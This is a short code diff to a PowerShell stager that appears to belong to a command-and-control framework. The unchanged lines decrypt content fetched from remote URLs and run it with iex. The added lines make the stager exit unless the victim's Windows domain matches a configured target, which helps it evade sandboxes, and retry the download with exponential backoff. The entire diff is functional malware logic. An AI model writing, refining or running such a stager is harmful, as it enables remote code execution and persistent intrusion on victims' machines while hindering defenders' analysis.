@@ -84,11 +84,24 @@ $p = dec -key #REPLACEKEY# -enc $primern
 if ($p -like "*key*") {$p| iex}
 }
 function primers {
+if(![string]::IsNullOrEmpty("#REPLACEMEDOMAIN#") -and ![Environment]::UserDomainName.Contains("#REPLACEMEDOMAIN#"))
+{
+    return;
+}
 foreach($url in $urls){
 $index = [array]::IndexOf($urls, $url)
 try {primern $url $curl $df[$index]} catch {write-output $error[0]}}}
-primers
-Start-Sleep 300
-primers
-Start-Sleep 600
-primers
+$limit=#REPLACESTAGERRETRIESLIMIT#
+if($#REPLACESTAGERRETRIES#){
+    $wait = #REPLACESTAGERRETRIESWAIT#
+    while($true -and $limit -gt 0){
+        $limit = $limit -1;
+        primers
+        Start-Sleep $wait
+        $wait = $wait * 2;
+    }
+}
+else
+{
+    primers
+}
